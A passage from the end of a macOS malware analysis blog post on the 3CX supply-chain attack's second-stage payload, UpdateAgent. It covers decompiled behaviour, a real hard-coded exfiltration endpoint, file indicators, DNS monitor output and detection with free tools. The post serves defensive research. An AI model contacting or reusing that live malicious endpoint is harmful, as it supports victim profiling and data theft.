</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; 
</span></span></code></pre></div>
<p>As the decompilation shows, once the <code>send_post</code> returns, the response is freed. Then, the function, returns. As the function (that invokes <code>send_post</code> and then simply returns) is <code>main</code>, this means the process is exiting.</p>
<p>This might at first seem a bit strange &hellip;wouldn&rsquo;t we expect the <code>UpdateBinary</code> to do something after it has received a response? Usually we see malware treating a response as tasking (and thus then executing some attacker-specified commands), or, as was the case with the 1<sup>st</sup>-stage payload, saving and executing the response as an next-stage payload.</p>
<p>However if take a closer look at <code>UpdateAgent</code>&rsquo;s URI API endpoint, recall it&rsquo;s <code>https://sbmsa.wiki/blog/_insert</code> &hellip;maybe the purpose of <code>UpdateAgent</code> is simply to report information about its victims &hellip;<em>inserting</em> them into some back-end server (found at the <code>_insert</code> endpoint). This would make sense a supply-chain attacks indiscriminately infect a large number of victims, most of whom to a nationstate APT group (e.g. Lazarus) are of little interest.</p>
<p>This concept is well articulated by <a href="https://twitter.com/juanandres_gs">J. A. Guerrero-Saade</a> who noted:</p>
<blockquote>
<p>That&rsquo;s up to say, the [supply-chain] attacker  gets thousands of victims, collects everything they need for future compromises, profiles their haul, and decides how to maximize that access.</p>
</blockquote>
<center>
    <blockquote class="twitter-tweet"><p lang="en" dir="ltr">That’s up to say, the attacker gets thousands of victims, collects everything they need for future compromises, profiles their haul, and decides how to maximize that access. Think— trojanizing CCleaner suspected of leading to <a href="https://twitter.com/ASUS?ref_src=twsrc%5Etfw">@ASUS</a> LiveUpdate compromise. <a href="https://t.co/CDbMKdrulQ">https://t.co/CDbMKdrulQ</a></p>&mdash; J. A. Guerrero-Saade (@juanandres_gs) <a href="https://twitter.com/juanandres_gs/status/1642151623605510144?ref_src=twsrc%5Etfw">April 1, 2023</a></blockquote>
    <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center> 
<p>Also worth recalling that each time the 1<sup>st</sup>-stage payload was run, it would (re)download and (re)execute <code>UpdateAgent</code> &hellip;meaning at any time the Lazarus group hacker&rsquo;s could for targets of interest, update/swap out the <code>UpdateAgent</code>&rsquo;s code, perhaps for a persistent, fully featured implant.</p>
<h3 id="detection--protection">Detection / Protection</h3>
<p>Let&rsquo;s end by talking how to detect and protect against this 2<sup>nd</sup>-stage payload.</p>
<p>First, detection should be trivial, as many of components of the malware are hard-coded and thus static:</p>
<p>File based IoCs (found in <code>~/Library/Application Support/3CX Desktop App/</code>)</p>
<ul>
<li><code>.main_storage</code></li>
<li><code>UpdateAgent</code> (though as this self-deletes, it might be gone)</li>
</ul>
<p>Embedded Domain:</p>
<ul>
<li><code>https://sbmsa.wiki/blog/_insert</code></li>
</ul>
<p>In terms of detentions, Objective-See&rsquo;s free open-source tools can help!</p>
<p>First, <a href="https://objective-see.org/products/blockblock.html">BlockBlock</a> (running in &ldquo;Notarization&rdquo; mode) will both detect and block <code>UpdateAgent</code> before it&rsquo;s allowed to execute &hellip;as the malware is not notarized:</p>
<img src="../images/blog/blog_0x74/BB.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">BlockBlock ...block blocking!</center>

<p>At the network level, as we showed earlier <a href="https://objective-see.org/products/utilities.html#DNSMonitor">DNSMonitor</a>, will detect when the malware attempts to resolve the domain named of its remote server:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

% DNSMonitor.app/Contents/MacOS/DNSMonitor -json -pretty
[{
  "Process" : {
    "pid" : 40063,
    "signing ID" : "payload2-55554944839216049d683075bc3f5a8628778bb8",
    "path" : "\/Users\/patrick\/Library\/Application Support\/3CX Desktop App\/UpdateAgent"
  },
  "Packet" : {
    "Opcode" : "Standard",
    "QR" : "Query",
    "Questions" : [
      {
        "Question Name" : "sbmsa.wiki",
        "Question Class" : "IN",
        "Question Type" : "?????"
      }
    ],
    "RA" : "No recursion available",
    "Rcode" : "No error",
    "RD" : "Recursion desired",
    "XID" : 25349,
    "TC" : "Non-Truncated",
    "AA" : "Non-Authoritative"
  }
}
</pre>
</div>
<p>Finally <a href="https://objective-see.org/products/lulu.html">LuLu</a> can also detect the malware&rsquo;s unauthorized network access. What really can tip us off that something is amiss based on LuLu&rsquo;s alert is that the program, <code>UpdateAgent</code> accessing the internet has self-deleted (and thus is struck through in the alert):</p>
<img src="../images/blog/blog_0x74/LuLu.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">LuLu ...detecting unauthorized network access</center>

<div class="note">
Make sure you are running the latest version of LuLu (v2.4.3) that improved the handling of self-deleted processes.
</div>
<h3 id="conclusion">Conclusion</h3>
<p>Today we added a missing yet another puzzle piece to the 3CX supply chain attack. Here, for the first time, we detailed the attacker&rsquo;s 2<sup>nd</sup> macOS payload: <code>UpdateAgent</code>.</p>
<p>Moreover, we provided IoCs for detection and described how our free, open-source tools could provide protection, even with no a priori knowledge of this threat!</p>
<p>I want to end by including an awesome diagrammatic overview of (macOS components) of the 3CX supply chain attack, created by the talented <a href="https://twitter.com/fr0gger_">Thomas Roccia</a>, as it provides a great visual overview of what we covered in both our part I and part II writeups!</p>
<img src="../images/blog/blog_0x74/overview.jpeg"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">OverView (image credit: Thomas Roccia (fr0gger_))</center>

<br>
<br>
<div class="note">
<b><span style="font-size: 20px;">Interested in Mac Malware Analysis Techniques?</span></b>
<br>
<br>
<table style="border: 0px;">
  <tr>
    <td style="border: 0px;">
      <img style="border-radius: 15px;" src="../images/blog/blog_0x6B/book.png" width="300px;">
    </td>
    <td style="border: 0px; font-size: 17px;" width="75%";>
    You're in luck, as I've written a book on this topic! It's 100% free online while all royalties from sale of the printed version donated to the Objective-See Foundation.
    <br>
    <br>
  <center>
  <a class="inlineLink" href="https://taomm.org">The Art Of Mac Malware, Vol. 0x1: Analysis</a>
  </center>
  </td>
  </tr>
  <tr>
    <td style="border: 0px;">&nbsp;</td>
    <td style="border: 0px;">&nbsp;</td>
  </tr>
  <tr>
    <td style="border: 0px;">
      <img style="border-radius: 15px;" src="https://objectivebythesea.org/v6/images/speakers/Patrick%20Wardle.png" height="300px;">
    </td>
    <td style="border: 0px; font-size: 17px;" width="75%";>
    Or, come attend our macOS security conference, "<a class="inlineLink" href="https://objectivebythesea.org/v6/index.html">Objective by the Sea</a>" v6.0 in sunny Spain! ...where I'm teaching a class on Mac Malware Detection &amp; Analysis
    <br>
    <br>
  <center>
    Sign up for the 
  <a class="inlineLink" href="https://objectivebythesea.org/v6/taomm.html">The Art of Mac Malware</a> training. 
  </center>
  </td>
  </tr>
</table>
</div>
</section>

    </div>

    
<script src="/js/cookies.js"></script>
<script src="/social/ss-social.js"></script>
<link href="/social/ss-social.css" rel="stylesheet" />

<script> 
    $(function(){
        
        
        
        if("" == getCookie("acceptedCookies")) 
        {
            document.getElementById("cookies").style.display = "block";
        }

    });
</script>

<script>
function acceptCookies() {

    
    setCookie("acceptedCookies", "yes", 365);

    
    document.getElementById("cookies").style.display = "none";
}
</script>

<br>
<br>
<div id="cookies" class="cookie" style="padding-left:20px;">
    This website uses cookies to improve your experience.
    <div class="cookieButton">
        
        <button class="menuicon button-4" role="button" onclick="acceptCookies()" style="margin-top: 12px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Okay!</button>
    </div>
</div>
<nav role="footer">
<ul>

    <li>
        <a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#x2709;</span></a>
    </li>

     <li>
        <a href="rss.xml" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xE310;</span></a>
    </li>

    <li>
        <a href="https://www.youtube.com/channel/UCQycc8VDhHuNkZlKSSTDHzw" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xF630;</span></a>
    </li>
   
    <li>
        <a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon">&#xF611;</span></a>
    </li>
    
    <li>
         <form action="/support.html" style="display: inline;">
            <button class="menuicon button-4" role="button" style="margin-top: 7px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Support Us!</button>
        </form>
        
    </li>

    <li>
        <div style="margin-top: 10px;">
        Signup for our <a class="inlineLink" target="_blank" href="http://eepurl.com/bXpXeT">newsletter </a> »
        </div>
    </li>

</ul>
</nav>

  </body>

</html>